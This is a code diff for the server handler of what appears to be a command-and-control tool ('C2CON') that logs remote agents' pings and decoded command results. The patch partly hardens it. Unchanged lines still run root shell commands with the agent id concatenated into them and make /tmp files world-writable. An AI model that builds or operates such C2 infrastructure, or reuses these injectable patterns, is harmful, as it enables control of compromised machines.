@@ -45,9 +45,9 @@ def default(request):
 			timenow = datetime.datetime.now()
 			timenow = timenow.strftime('%Y-%m-%d %H:%M:%S')
 			os.setuid(0)
-			os.system("chmod 777 /tmp/C2CON-temping")
+			os.system("chmod 666 /tmp/C2CON-temping")
 			os.system("cat /tmp/C2CON-ping.txt | grep -v " + sid + " > /tmp/C2CON-temping")
-			os.system("chmod 777 /tmp/C2CON-ping.txt")
+			os.system("chmod 666 /tmp/C2CON-ping.txt")
 			os.system("cat /tmp/C2CON-temping > /tmp/C2CON-ping.txt")
 			if o ==  "W":
 				cmd = "echo 'Last Ping - Agent " + sid + " (Windows) => "+ str(timenow) + "' >> /tmp/C2CON-ping.txt"
@@ -89,10 +89,9 @@ def default(request):
 			res = base64.b64decode(resp)
 			
 			os.setuid(0)
-			os.system("chmod 777 /tmp/C2CON-res.txt")
-			cmdres = "echo 'Agent " + sid + " => " + str(res.decode("utf-8")) + "' >> /tmp/C2CON-res.txt"
+			with open('/tmp/C2CON-res.txt', 'a') as dest:
+				dest.write("Agent " + sid + " => " + str(res.decode()))
 			
-			os.system(cmdres)
 			os.system("chmod 777 /tmp/C2CON-temp")
 			os.system("echo '' > /tmp/C2CON-temp")
 			os.system("chmod 777 /tmp/C2CON-cmds.txt")
